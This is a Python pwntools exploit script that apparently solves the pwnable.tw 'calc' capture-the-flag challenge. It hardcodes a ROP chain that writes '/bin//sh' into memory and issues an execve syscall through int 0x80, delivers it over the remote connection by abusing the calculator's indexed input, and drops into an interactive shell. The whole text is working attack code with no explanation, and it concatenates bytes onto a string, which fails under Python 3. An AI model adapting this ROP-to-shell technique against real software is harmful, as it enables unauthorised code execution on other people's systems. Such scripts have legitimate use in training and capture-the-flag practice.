from pwn import *
from struct import pack

p = ''

p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += pack('<I', 0x6e69622f)
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += pack('<I', 0x68732f2f)
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80

chain = [p[i:i+4] for i in range(0, len(p), 4)]


print(len(chain))

e = ELF("./calc")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([e.path])
p = remote("chall.pwnable.tw", 10100)

#context.log_level="debug"
#gdb.attach(p, """break * main+83""")




for d in range(len(chain)):
    print("+"+str(368+d)+"+"+str(u32(chain[d])))
    p.sendline("+"+str(368+d)+"+"+str(u32(chain[d]))+"+")
    
    p.recvline()

p.sendline()

p.interactive()






